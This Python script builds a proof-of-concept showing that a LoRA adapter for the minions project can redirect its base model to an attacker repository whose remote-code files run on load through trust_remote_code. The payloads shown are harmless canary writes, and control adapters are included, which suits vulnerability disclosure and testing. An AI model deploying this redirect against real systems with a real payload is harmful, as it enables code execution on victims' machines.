"""Attacker-side package builder for the HazyResearch/minions LoRA-adapter
base-model-redirect PoC.

Builds, under work/:
  hub/attacker/minions-base-with-program/   second repo WITH remote code
      configuration_minions_pwn.py  (canary on import)
      modeling_minions_pwn.py       (canary on import, tiny q_proj/v_proj model)
      tokenization_minions_pwn.py   (canary on import, tiny tokenizer)
      config.json / tokenizer_config.json / model.safetensors
  hub/victim/minions-base-data-only/        second repo, DATA ONLY (no .py)
      config.json / tokenizer_config.json / vocab.json / merges.txt
  adapter_attacker/   peft-minted LoRA adapter, base -> attacker repo
  adapter_dataonly/   byte-identical except base -> data-only repo
  adapter_nofield/    byte-identical except base_model_name_or_path deleted
  SHA256SUMS.txt

The three adapters differ ONLY in the base_model_name_or_path field - that is
the controlled variable of the experiment. The terminal payload of the chain
lives in the second repository's .py files, never in the adapter JSON itself.

Run with the repro venv (torch + transformers + peft + safetensors).
"""
import hashlib
import json
import os
import shutil

import torch
from peft import LoraConfig, get_peft_model
from safetensors.torch import save_file

HERE = os.path.dirname(os.path.abspath(__file__))
WORK = os.path.join(HERE, "work")
HUB = os.path.join(WORK, "hub")

ATTACKER_REPO = "attacker/minions-base-with-program"
DATAONLY_REPO = "victim/minions-base-data-only"

HIDDEN = 8
VOCAB = 32


def write(path, data):
    os.makedirs(os.path.dirname(path), exist_ok=True)
    mode = "wb" if isinstance(data, bytes) else "w"
    with open(path, mode, encoding=None if isinstance(data, bytes) else "utf-8") as f:
        f.write(data)


CONFIGURATION_PY = '''# Attacker-controlled remote code served from the second repository.
# Imported by transformers only because minions passes trust_remote_code=True.
from transformers import PretrainedConfig

with open("pwned_by_minions_adapter.txt", "a", encoding="utf-8") as f:
    f.write("code executed: configuration_minions_pwn.py IMPORTED (auto_map AutoConfig)\\n")

class MinionsPwnConfig(PretrainedConfig):
    model_type = "minions_pwn"
'''

MODELING_PY = '''# Attacker-controlled remote code served from the second repository.
# Imported by transformers only because minions passes trust_remote_code=True.
# The canary line below is the proof that attacker Python ran on the victim
# machine during model load; the model itself is a tiny stand-in whose
# q_proj / v_proj Linear(8, 8) modules match the LoRA adapter's targets.
import torch
import torch.nn as nn

from transformers import PreTrainedModel

from .configuration_minions_pwn import MinionsPwnConfig

with open("pwned_by_minions_adapter.txt", "a", encoding="utf-8") as f:
    f.write("code executed: modeling_minions_pwn.py IMPORTED (auto_map AutoModelForCausalLM)\\n")

class MinionsPwnForCausalLM(PreTrainedModel):
    config_class = MinionsPwnConfig
    base_model_prefix = "minions_pwn"

    def __init__(self, config):
        super().__init__(config)
        hidden = int(getattr(config, "hidden_size", %d))
        vocab = int(getattr(config, "vocab_size", %d))
        self.embed_tokens = nn.Embedding(vocab, hidden)
        self.q_proj = nn.Linear(hidden, hidden, bias=False)
        self.v_proj = nn.Linear(hidden, hidden, bias=False)
        self.lm_head = nn.Linear(hidden, vocab, bias=False)
        self.post_init()

    def get_input_embeddings(self):
        return self.embed_tokens

    def set_input_embeddings(self, value):
        self.embed_tokens = value

    def get_output_embeddings(self):
        return self.lm_head

    def set_output_embeddings(self, value):
        self.lm_head = value

    def forward(self, input_ids=None, **kwargs):
        emb = self.embed_tokens(input_ids)
        h = emb + self.q_proj(emb) + self.v_proj(emb)
        logits = self.lm_head(h)
        from transformers.modeling_outputs import CausalLMOutputWithCrossAttentions
        return CausalLMOutputWithCrossAttentions(logits=logits)
''' % (HIDDEN, VOCAB)

TOKENIZATION_PY = '''# Attacker-controlled remote code served from the second repository.
# Imported by transformers only because minions passes trust_remote_code=True.
from transformers import PreTrainedTokenizer

with open("pwned_by_minions_adapter.txt", "a", encoding="utf-8") as f:
    f.write("code executed: tokenization_minions_pwn.py IMPORTED (auto_map AutoTokenizer)\\n")

class MinionsPwnTokenizer(PreTrainedTokenizer):
    def _tokenize(self, text, **kwargs):
        return list(text)

    @property
    def vocab_size(self):
        return %d

    def get_vocab(self):
        return {chr(65 + i): i for i in range(%d)}
''' % (VOCAB, VOCAB)


def build_attacker_repo():
    repo = os.path.join(HUB, *ATTACKER_REPO.split("/"))
    write(os.path.join(repo, "configuration_minions_pwn.py"), CONFIGURATION_PY)
    write(os.path.join(repo, "modeling_minions_pwn.py"), MODELING_PY)
    write(os.path.join(repo, "tokenization_minions_pwn.py"), TOKENIZATION_PY)
    write(os.path.join(repo, "config.json"), json.dumps({
        "model_type": "minions_pwn",
        "auto_map": {
            "AutoConfig": "configuration_minions_pwn.MinionsPwnConfig",
            "AutoModelForCausalLM": "modeling_minions_pwn.MinionsPwnForCausalLM",
        },
        "architectures": ["MinionsPwnForCausalLM"],
        "hidden_size": HIDDEN,
        "vocab_size": VOCAB,
        "num_hidden_layers": 1,
        "tie_word_embeddings": False,
    }, indent=2))
    write(os.path.join(repo, "tokenizer_config.json"), json.dumps({
        "tokenizer_class": "MinionsPwnTokenizer",
        "auto_map": {"AutoTokenizer": ["tokenization_minions_pwn.MinionsPwnTokenizer", None]},
        "pad_token": "[PAD]",
    }, indent=2))
    torch.manual_seed(1337)
    model_state = {
        "embed_tokens.weight": torch.randn(VOCAB, HIDDEN),
        "q_proj.weight": torch.randn(HIDDEN, HIDDEN),
        "v_proj.weight": torch.randn(HIDDEN, HIDDEN),
        "lm_head.weight": torch.randn(VOCAB, HIDDEN),
    }
    save_file(model_state, os.path.join(repo, "model.safetensors"),
              metadata={"format": "pt"})
    return repo


def build_dataonly_repo():
    repo = os.path.join(HUB, *DATAONLY_REPO.split("/"))
    # byte-level BPE data files, same shape as a real GPT-2 tokenizer - data
    # only, not a single .py in the repository
    vocab = {"<|endoftext|>": 0}
    for i in range(32, 127):
        vocab[chr(i)] = i - 31
    merges = "#version: 0.2\n"
    write(os.path.join(repo, "vocab.json"), json.dumps(vocab))
    write(os.path.join(repo, "merges.txt"), merges)
    write(os.path.join(repo, "config.json"), json.dumps({
        "model_type": "gpt2",
        "architectures": ["GPT2LMHeadModel"],
        "n_embd": 8,
        "n_layer": 1,
        "n_head": 1,
        "n_positions": 16,
        "vocab_size": len(vocab),
    }, indent=2))
    write(os.path.join(repo, "tokenizer_config.json"), json.dumps({
        "tokenizer_class": "GPT2TokenizerFast",
    }, indent=2))
    return repo


class _LocalTwinConfig:
    pass


def build_adapters():
    """Mint the LoRA adapter with peft against a local twin of the served
    model class (same parameter names and shapes, so the adapter fits the
    remote-code model the victim will build). The twin is NOT the payload -
    the payload is the second repository's .py files."""
    from transformers import PreTrainedModel, PretrainedConfig
    import torch.nn as nn

    class TwinConfig(PretrainedConfig):
        model_type = "twin"

    class TwinModel(PreTrainedModel):
        config_class = TwinConfig
        base_model_prefix = "twin"

        def __init__(self, config):
            super().__init__(config)
            self.embed_tokens = nn.Embedding(VOCAB, HIDDEN)
            self.q_proj = nn.Linear(HIDDEN, HIDDEN, bias=False)
            self.v_proj = nn.Linear(HIDDEN, HIDDEN, bias=False)
            self.lm_head = nn.Linear(HIDDEN, VOCAB, bias=False)
            self.post_init()

        def get_input_embeddings(self):
            return self.embed_tokens

        def set_input_embeddings(self, value):
            self.embed_tokens = value

        def get_output_embeddings(self):
            return self.lm_head

        def set_output_embeddings(self, value):
            self.lm_head = value

    torch.manual_seed(1337)
    base = TwinModel(TwinConfig(hidden_size=HIDDEN, vocab_size=VOCAB))
    lcfg = LoraConfig(r=8, lora_alpha=16, target_modules=["q_proj", "v_proj"])
    peft_model = get_peft_model(base, lcfg)
    peft_model.eval()
    with torch.no_grad():  # attacker-chosen adapter weights, deterministic
        for n, p in peft_model.named_parameters():
            if "lora_" in n:
                p.copy_(torch.linspace(-0.05, 0.05, p.numel()).reshape(p.shape))

    adapter_dir = os.path.join(WORK, "adapter_attacker")
    peft_model.save_pretrained(adapter_dir)

    cfg_path = os.path.join(adapter_dir, "adapter_config.json")
    with open(cfg_path, encoding="utf-8") as f:
        cfg = json.load(f)
    cfg["base_model_name_or_path"] = ATTACKER_REPO
    with open(cfg_path, "w", encoding="utf-8") as f:
        json.dump(cfg, f, indent=2)

    dataonly = os.path.join(WORK, "adapter_dataonly")
    nofield = os.path.join(WORK, "adapter_nofield")
    for d in (dataonly, nofield):
        if os.path.exists(d):
            shutil.rmtree(d)
        shutil.copytree(adapter_dir, d)
    with open(os.path.join(dataonly, "adapter_config.json"), encoding="utf-8") as f:
        cfg2 = json.load(f)
    cfg2["base_model_name_or_path"] = DATAONLY_REPO
    with open(os.path.join(dataonly, "adapter_config.json"), "w", encoding="utf-8") as f:
        json.dump(cfg2, f, indent=2)
    nf_path = os.path.join(nofield, "adapter_config.json")
    with open(nf_path, encoding="utf-8") as f:
        cfg3 = json.load(f)
    cfg3.pop("base_model_name_or_path", None)
    with open(nf_path, "w", encoding="utf-8") as f:
        json.dump(cfg3, f, indent=2)
    return adapter_dir, dataonly, nofield


def sha256(path):
    h = hashlib.sha256()
    with open(path, "rb") as f:
        for chunk in iter(lambda: f.read(65536), b""):
            h.update(chunk)
    return h.hexdigest()


def write_sums():
    lines = []
    for root, _dirs, files in os.walk(WORK):
        if "hf-home-" in root:
            continue
        for name in sorted(files):
            if name == "SHA256SUMS.txt" or name.startswith("hub_requests"):
                continue
            p = os.path.join(root, name)
            rel = os.path.relpath(p, WORK).replace("\\", "/")
            lines.append("%s  %s" % (sha256(p), rel))
    write(os.path.join(WORK, "SHA256SUMS.txt"), "\n".join(lines) + "\n")


def main():
    if os.path.exists(HUB):
        shutil.rmtree(HUB)
    build_attacker_repo()
    build_dataonly_repo()
    a, d, n = build_adapters()
    canary = os.path.join(HERE, "pwned_by_minions_adapter.txt")
    if os.path.exists(canary):
        os.remove(canary)
    write_sums()
    print("[poc] work tree under %s" % WORK)
    print("[poc] hub repos:")
    print("[poc]   %s  (config + tokenizer + model + 3 remote-code .py files)" % ATTACKER_REPO)
    print("[poc]   %s  (config + tokenizer data files, zero .py)" % DATAONLY_REPO)
    print("[poc] adapters (identical except base_model_name_or_path):")
    for path in (a, d, n):
        with open(os.path.join(path, "adapter_config.json"), encoding="utf-8") as f:
            cfg = json.load(f)
        print("[poc]   %-14s -> %r" % (
            os.path.basename(path) + "/",
            cfg.get("base_model_name_or_path", "<key absent>")))
    print("[poc] hashes in work/SHA256SUMS.txt")
    print("[poc] canary file removed; each victim run starts clean")


if __name__ == "__main__":
    main()
